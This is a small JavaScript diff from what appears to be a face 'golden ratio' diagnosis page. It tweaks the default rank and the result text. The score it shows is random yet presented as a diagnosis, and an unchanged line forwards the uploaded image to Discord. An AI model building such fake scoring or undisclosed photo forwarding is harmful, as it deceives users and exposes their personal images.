@@ -92,7 +92,7 @@ function send() {
 
     // 仮の診断ロジック
     const score = Math.floor(70 + Math.random() * 25);
-    let rank = "B";
+    let rank = "-d";
     if (score >= 90) rank = "S";
     else if (score >= 80) rank = "A";
 
@@ -100,7 +100,7 @@ function send() {
       <b>診断結果</b><br>
       黄金比スコア：<b>${score}%</b><br>
       ランク：<b>${rank}</b><br>
-      バランスの良い顔立ちです
+      いいと思います
     `;
 
     sendToDiscord(reader.result, score, rank);
